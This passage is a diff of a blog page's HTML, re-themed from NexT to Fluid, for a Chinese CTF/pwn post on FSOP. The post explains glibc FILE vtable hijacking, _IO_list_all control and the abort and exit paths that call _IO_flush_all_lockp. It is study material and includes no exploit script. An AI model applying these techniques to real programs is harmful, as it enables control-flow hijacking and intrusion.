@@ -1,274 +1,312 @@
+
+
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
 <head>
   <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.4.2">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"akaieurus.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
-  </script>
-
-  <meta name="description" content="开——学——啦——真——开——心——啊——o(￣▽￣)ブIO的学习也正式开始了，开学也要继续加油！禁止摆烂！(ง •_•)ง">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon/icon.jpg">
+  <link rel="icon" href="/img/favicon/icon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Eurus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="开——学——啦——真——开——心——啊——o(￣▽￣)ブIO的学习也正式开始了，开学也要继续加油！禁止摆烂！(ง •_•)ง">
 <meta property="og:type" content="article">
 <meta property="og:title" content="FSOP">
 <meta property="og:url" content="http://akaieurus.github.io/2023/02/20/FSOP/index.html">
 <meta property="og:site_name" content="Eurus禁止摆烂！">
 <meta property="og:description" content="开——学——啦——真——开——心——啊——o(￣▽￣)ブIO的学习也正式开始了，开学也要继续加油！禁止摆烂！(ง •_•)ง">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://akaieurus.github.io/2023/02/20/FSOP/IO_strfile.png">
-<meta property="og:image" content="http://akaieurus.github.io/2023/02/20/FSOP/read_data.png">
-<meta property="og:image" content="http://akaieurus.github.io/2023/02/20/FSOP/mmap.png">
-<meta property="og:image" content="http://akaieurus.github.io/2023/02/20/FSOP/1.jpg">
-<meta property="og:image" content="http://akaieurus.github.io/2023/02/20/FSOP/2.jpg">
-<meta property="og:image" content="http://akaieurus.github.io/2023/02/20/FSOP/3.jpg">
-<meta property="og:image" content="http://akaieurus.github.io/2023/02/20/FSOP/4.jpg">
-<meta property="og:image" content="http://akaieurus.github.io/2023/02/20/FSOP/fake.png">
-<meta property="og:image" content="http://akaieurus.github.io/2023/02/20/FSOP/IO_FILE.png">
-<meta property="og:image" content="http://akaieurus.github.io/2023/02/20/FSOP/vtable.png">
-<meta property="og:image" content="http://akaieurus.github.io/2023/02/20/FSOP/bt.png">
-<meta property="og:image" content="http://akaieurus.github.io/2023/02/20/FSOP/vmmap.png">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://akaieurus.github.io/img/posts/pc10.jpg">
 <meta property="article:published_time" content="2023-02-20T04:34:31.000Z">
-<meta property="article:modified_time" content="2023-08-21T12:04:50.076Z">
+<meta property="article:modified_time" content="2024-01-29T11:19:26.612Z">
 <meta property="article:author" content="Eurus">
 <meta property="article:tag" content="IO">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://akaieurus.github.io/2023/02/20/FSOP/IO_strfile.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://akaieurus.github.io/img/posts/pc10.jpg">
+  
+  
+  
+  <title>FSOP - Eurus禁止摆烂！</title>
 
-<link rel="canonical" href="http://akaieurus.github.io/2023/02/20/FSOP/">
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
 
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome : false,
-    isPost : true,
-    lang   : 'en'
-  };
-</script>
 
-  <title>FSOP | Eurus禁止摆烂！</title>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
   
 
 
 
 
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"akaieurus.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
 
 
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
 
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
 
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
+<body>
+  
 
-</head>
+  <header>
+    
 
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">Eurus禁止摆烂！</h1>
-      <span class="logo-line-after"><i></i></span>
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Eurus&#39;s blog</strong>
     </a>
-      <p class="site-subtitle" itemprop="description">In a world of locked rooms, the man with the key is king.</p>
-  </div>
 
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
     </div>
   </div>
-</div>
-
-
-
-
-<nav class="site-nav">
-  <ul id="menu" class="main-menu menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
-
-  </li>
-        <li class="menu-item menu-item-about">
-
-    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
-
-  </li>
-        <li class="menu-item menu-item-tags">
-
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
-
-  </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
-
-  </li>
-  </ul>
 </nav>
 
+  
 
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/posts/pc10.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="FSOP"></span>
+          
+        </div>
 
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-02-20 12:34" pubdate>
+          2023年2月20日 下午
+        </time>
+      </span>
+    
+  </div>
 
-</div>
-    </header>
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.5k 字
+        
+      </span>
+    
 
     
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          21 分钟
+        
+      </span>
+    
+
+    
+    
   </div>
 
 
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content post posts-expand">
-            
-
-    
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://akaieurus.github.io/2023/02/20/FSOP/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="Eurus">
-      <meta itemprop="description" content="本人2022年11月—12月进入了一种原因未知的摆烂状态，故搭建博客来警醒自己。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Eurus禁止摆烂！">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          FSOP
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-02-20 12:34:31" itemprop="dateCreated datePublished" datetime="2023-02-20T12:34:31+08:00">2023-02-20</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-08-21 20:04:50" itemprop="dateModified" datetime="2023-08-21T20:04:50+08:00">2023-08-21</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/pwn/IO/" itemprop="url" rel="index"><span itemprop="name">IO</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+        
+      </div>
 
       
-        <p>开——学——啦——真——开——心——啊——o(<em>￣▽￣</em>)ブ<br>IO的学习也正式开始了，开学也要继续加油！禁止摆烂！(ง •_•)ง</p>
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">FSOP</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>开——学——啦——真——开——心——啊——o(<em>￣▽￣</em>)ブ<br>IO的学习也正式开始了，开学也要继续加油！禁止摆烂！(ง •_•)ง</p>
 <span id="more"></span>
 <h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h3><h4 id="vtable劫持"><a href="#vtable劫持" class="headerlink" title="vtable劫持"></a>vtable劫持</h4><p>许多IO相关函数都调用了_IO_FILE_plus结构体中的vtable指针指向的跳转表中的函数，如果能够劫持vtable那么我们就能改变程序流<br>劫持vtable有两种方式，只修改_IO_FILE结构体的vtable指针或者直接伪造整个_IO_FILE结构体</p>
 <h4 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h4><p>全局变量_IO_list_all利用单链表管理所有_IO_FILE结构体，如果我们能够控制_IO_list_all或者控制某个_IO_FILE的_chain指针，我们就能进行伪造_IO_FILE结构体的vtable劫持<br>_IO_flush_all_lockp函数用于刷新所有FILE结构体的输出缓冲区，源码如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.23\libio\genops.c</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line">  last_stamp = _IO_list_all_stamp;</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	   )<span class="comment">//如果输出缓冲区有数据，则调用_IO_OVERFLOW刷新输出缓冲区</span></span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (last_stamp != _IO_list_all_stamp)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Something was added to the list.  Start all over again.  */</span></span><br><span class="line">	  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">	  last_stamp = _IO_list_all_stamp;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	fp = fp-&gt;_chain;<span class="comment">//遍历单链表</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_unlock (list_all_lock);</span><br><span class="line">  __libc_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c</span><br><br><span class="hljs-type">int</span><br>_IO_flush_all_lockp (<span class="hljs-type">int</span> do_lock)<br>&#123;<br>  <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *<span class="hljs-title">fp</span>;</span><br>  <span class="hljs-type">int</span> last_stamp;<br><br>  last_stamp = _IO_list_all_stamp;<br>  fp = (_IO_FILE *) _IO_list_all;<br>  <span class="hljs-keyword">while</span> (fp != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      run_fp = fp;<br>      <span class="hljs-keyword">if</span> (do_lock)<br>	_IO_flockfile (fp);<br><br>      <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>	   || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>	       &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>	   )<span class="hljs-comment">//如果输出缓冲区有数据，则调用_IO_OVERFLOW刷新输出缓冲区</span><br>	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<br>	result = EOF;<br><br>      <span class="hljs-keyword">if</span> (do_lock)<br>	_IO_funlockfile (fp);<br>      run_fp = <span class="hljs-literal">NULL</span>;<br><br>      <span class="hljs-keyword">if</span> (last_stamp != _IO_list_all_stamp)<br>	&#123;<br>	  <span class="hljs-comment">/* Something was added to the list.  Start all over again.  */</span><br>	  fp = (_IO_FILE *) _IO_list_all;<br>	  last_stamp = _IO_list_all_stamp;<br>	&#125;<br>      <span class="hljs-keyword">else</span><br>	fp = fp-&gt;_chain;<span class="hljs-comment">//遍历单链表</span><br>    &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  <span class="hljs-keyword">if</span> (do_lock)<br>    _IO_lock_unlock (list_all_lock);<br>  __libc_cleanup_region_end (<span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>
 <p>调用_IO_flush_all_lockp的过程有：</p>
 <ul>
-<li>libc执行abort函数时，堆非法操作可触发，调用栈如下：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fflush(_IO_fflush)-&gt;_IO_flush_all-&gt;_IO_flush_all_lockp</span><br><span class="line"><span class="built_in">abort</span></span><br><span class="line">__libc_message</span><br><span class="line">malloc_printerr</span><br></pre></td></tr></table></figure></li>
-<li>调用exit函数时<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_flush_all_lockp</span><br><span class="line">_IO_cleanup</span><br><span class="line">_run_exit_handlers</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure></li>
+<li>libc执行abort函数时，堆非法操作可触发，调用栈如下：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">fflush(_IO_fflush)-&gt;_IO_flush_all-&gt;_IO_flush_all_lockp<br><span class="hljs-built_in">abort</span><br>__libc_message<br>malloc_printerr<br></code></pre></td></tr></table></figure></li>
+<li>调用exit函数时<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_flush_all_lockp<br>_IO_cleanup<br>_run_exit_handlers<br><span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure></li>
 <li>程序正常退出时（同调用exit，因为程序正常退出的时候会调用exit）<br>整个利用过程就是劫持_IO_list_all或者某个_IO_FILE的_chain指针，然后通过以上三种方式触发_IO_flush_all_lockp函数调用</li>
 </ul>
-<h4 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc_printerr-&gt;__libc_message-&gt;<span class="built_in">abort</span>-&gt;_IO_flush_all_lockp-&gt;_IO_OVERFLOW</span><br></pre></td></tr></table></figure>
+<h4 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">malloc_printerr-&gt;__libc_message-&gt;<span class="hljs-built_in">abort</span>-&gt;_IO_flush_all_lockp-&gt;_IO_OVERFLOW<br></code></pre></td></tr></table></figure>
 
 <h3 id="2-24-2-27"><a href="#2-24-2-27" class="headerlink" title="2.24-2.27"></a>2.24-2.27</h3><h4 id="vtable-check"><a href="#vtable-check" class="headerlink" title="vtable check"></a>vtable check</h4><p>2.24中_IO_OVERFLOW的宏定义发生了变化（以下宏定义皆来自glibc-2.24\libio\libioP.h）  </p>
 <ul>
-<li>_IO_OVERFLOW<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br></pre></td></tr></table></figure></li>
-<li>JUMP1<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br></pre></td></tr></table></figure></li>
-<li>_IO_JUMPS_FUNC<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> _IO_JUMPS_OFFSET</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) \</span></span><br><span class="line"><span class="meta">  (IO_validate_vtable                                                   \</span></span><br><span class="line"><span class="meta">   (*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS)	\</span></span><br><span class="line"><span class="meta">			     + (THIS)-&gt;_vtable_offset)))</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_vtable_offset(THIS) (THIS)-&gt;_vtable_offset</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_vtable_offset(THIS) 